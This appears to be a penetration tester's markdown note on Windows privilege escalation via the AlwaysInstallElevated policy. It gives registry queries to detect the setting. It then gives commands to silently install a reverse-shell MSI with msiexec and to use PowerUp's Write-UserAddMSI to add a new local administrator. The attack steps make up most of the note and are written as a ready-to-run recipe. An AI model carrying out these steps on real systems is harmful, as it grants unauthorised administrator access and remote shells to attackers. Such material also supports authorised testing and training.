#### 1st Method

**Detection**

Open command prompt and type: 

```command prompt - windows
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

From the output, notice that “AlwaysInstallElevated” value is 1.  

In command prompt type: 

```command prompt - windows
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
```

From the output, notice that “AlwaysInstallElevated” value is 1.

Extra step: Run the following to look for any conditions.
```powershell - target
get-applockerpolicy -effective | select -expandproperty rulecollections
```

In this example, the malicious msi file would need to go in the `C:\Administrator` path.

![[Pasted image 20220927101417.png]]

**Exploitation**

[[1._Reverse Shells (WIN)#msi]]

Place ‘reverse.msi’ in `C:\Temp`.  

Open command prompt and type: 

```command prompt - windows
msiexec /quiet /qn /i C:\<PUT_THE_ENTIRE_PATH>\reverse.msi
```

#### 2nd Method
```command prompt - windows
powershell -ep bypass
```

```powershell - windows
. .\PowerUp.ps1
```

```powershell - windows
Invoke-AllChecks
```

![[Pasted image 20220207104341.png]]

```powershell - windows
Write-UserAddMSI
```

Now you will see a UserAdd file in the same directory as the PowerUp file.

![[Pasted image 20220207104500.png]]

Open the UserAdd file.

Fill in details, click create.

```command prompt - windows
net localgroup administrators
```

See our new user is now listed there.

